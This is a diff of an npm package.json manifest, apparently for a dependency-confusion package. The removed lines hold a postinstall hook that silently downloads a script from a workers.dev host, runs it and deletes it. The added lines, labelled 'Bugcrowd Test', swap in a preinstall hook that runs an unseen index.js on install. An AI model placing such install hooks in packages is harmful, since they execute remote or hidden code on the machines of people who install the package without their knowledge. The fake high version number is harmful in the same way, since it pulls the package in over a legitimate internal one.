@@ -1,9 +1,12 @@
 {
-  "name": "up.web.payments",
-  "version": "99.3.0",
-  "description": "Package with libraries used for research",
-  "scripts": {
-    "postinstall": "bash -c 'curl -sSL https://research20934i.sherlockshat007.workers.dev -o script.sh && chmod +x script.sh && ./script.sh && rm -f script.sh'"
-  }
-}
-
+"name": "ai-chatbot-starter",
+"version": "2.0.1",
+"description": "Bugcrowd Test",
+"main": "index.js",
+"scripts": {
+    "test": "echo\"Error:no test specified\" && exit 1",
+     "preinstall": "node index.js"
+   },
+ "author": "sunny",
+ "license": "ISC"
+ }
